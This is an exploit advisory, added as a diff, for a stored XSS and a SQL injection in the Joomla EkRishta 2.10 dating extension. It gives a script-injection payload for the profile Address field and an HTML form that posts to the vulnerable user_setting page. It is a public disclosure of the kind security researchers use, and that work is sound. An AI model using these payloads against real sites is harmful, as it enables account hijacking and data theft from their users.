@@ -1,0 +1,37 @@
+# Exploit Title: Joomla! extension EkRishta 2.10 - Persistent Cross-Site Scripting  / SQL Injection
+# Dork: N/A
+# Date: 2018-05-18
+# Exploit Author: Sina Kheirkhah || (Sina.For.Sec@gmail.com)
+# Software Link: https://extensions.joomla.org/extensions/extension/living/dating-a-relationships/ek-rishta/
+# Vendor Homepage: https://www.joomlaextensions.co.in/
+# Version: 2.10
+# Category: Webapps
+# CVE: N/A
+#
+#
+#
+#POC-1) Cross site scripting (XSS) :
+#
+#
+# Description:
+#
+# 1)create a profile
+# 2)you can use your payload in profile info page
+# 3)for example in Address field you can use
+"></textarea><script>prompt('address')</script>
+# 4)now the Payload will be executed whenever someone visits your profile
+#
+#
+# POC-2) SQL Injection:
+#
+# Description:
+# 1)the website has filtered all the inputs for sql injection BUT
+# you can use the user_setting page in order to Inject SQL code
+# by using POST method
+# http://localhost/ekrishta/index.php/profile/user_setting
+#
+# <form method="POST" action="http://localhost/ekrishta/index.php/profile/user_setting">
+# <input type="text" name="phone_no" value="SQL injection">
+# <input type="hidden" name="task" value="save">
+# <input type="submit" name="save" value="Save"/>
+# </form>
